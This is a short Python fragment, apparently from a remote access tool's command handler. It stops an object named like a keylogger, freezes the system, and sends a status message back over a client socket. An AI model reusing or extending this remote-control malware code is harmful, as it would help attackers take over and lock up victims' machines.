
nt_kl.stop()
status = nt_kl.get_frz_status()
if status:
    resp = '[+] System is already frozen\n'
else:
    nt_kl.start_freeze()
    status = nt_kl.get_frz_status()
    if status:
        resp = '[+] System is now frozen\n'
    else:
        resp = '[!] System failed to freeze\n'

send(client_socket,resp)
